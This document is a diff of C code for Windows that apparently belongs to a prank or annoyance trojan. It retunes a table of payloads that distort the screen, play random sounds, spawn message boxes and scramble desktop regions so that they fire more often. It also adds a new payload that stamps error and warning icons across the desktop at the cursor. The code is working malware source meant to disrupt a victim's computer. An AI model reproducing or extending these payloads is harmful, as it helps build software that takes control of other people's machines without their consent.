@@ -2,14 +2,15 @@
 
 const PAYLOAD payloads[] = {
 	{ payloadExecute, 30000 },
-	{ payloadCursor, 40000 },
+	{ payloadCursor, 30000 },
 	{ payloadKeyboard, 20000 },
-	{ payloadSound, 60000 },
+	{ payloadSound, 50000 },
 	{ payloadBlink, 30000 },
 	{ payloadMessageBox, 20000 },
+	{ payloadDrawErrors, 10000 },
 	{ payloadChangeText, 40000 },
-	{ payloadPIP, 80000 },
-	{ payloadPuzzle, 15000 },
+	{ payloadPIP, 60000 },
+	{ payloadPuzzle, 15000 }
 };
 
 const size_t nPayloads = sizeof(payloads) / sizeof(PAYLOAD);
@@ -60,7 +61,7 @@ int payloadCursor(int times, int runtime) {
 int payloadMessageBox(int times, int runtime) {
 	CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
 
-	return 2000.0 / (times / 10.0 + 1) + 100 + (random() % 120);
+	return 2000.0 / (times / 8.0 + 1) + 20 + (random() % 30);
 }
 
 DWORD WINAPI messageBoxThread(LPVOID parameter) {
@@ -120,7 +121,7 @@ void enumerateChildren(HWND hwnd) {
 
 int payloadSound(int times, int runtime) {
 	PlaySoundA(sounds[random() % nSounds], NULL, SND_ASYNC);
-	return 10 + (random() % 20);
+	return 20 + (random() % 20);
 }
 
 int payloadPuzzle(int times, int runtime) {
@@ -139,7 +140,7 @@ int payloadPuzzle(int times, int runtime) {
 	BitBlt(hdc, x1, y1, width, height, hdc, x2, y2, SRCCOPY);
 	ReleaseDC(hwnd, hdc);
 
-	return 200.0 / (times / 5.0 + 1) + 5;
+	return 200.0 / (times / 5.0 + 1) + 3;
 }
 
 int payloadKeyboard(int times, int runtime) {
@@ -160,5 +161,26 @@ int payloadPIP(int times, int runtime) {
 	StretchBlt(hdc, 50, 50, rekt.right - 100, rekt.bottom - 100, hdc, 0, 0, rekt.right, rekt.bottom, SRCCOPY);
 	ReleaseDC(hwnd, hdc);
 
-	return 200.0 / (times / 5.0 + 1) + 5;
+	return 200.0 / (times / 5.0 + 1) + 4;
+}
+
+int payloadDrawErrors(int times, int runtime) {
+	int ix = GetSystemMetrics(SM_CXICON) / 2;
+	int iy = GetSystemMetrics(SM_CYICON) / 2;
+	
+	HWND hwnd = GetDesktopWindow();
+	HDC hdc = GetWindowDC(hwnd);
+
+	POINT cursor;
+	GetCursorPos(&cursor);
+
+	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_ERROR));
+
+	if (random() % (int)(10/(times/500.0+1)+1) == 0) {
+		DrawIcon(hdc, random()%scrw, random()%scrh, LoadIcon(NULL, IDI_WARNING));
+	}
+	
+	ReleaseDC(hwnd, hdc);
+
+	return 2;
 }
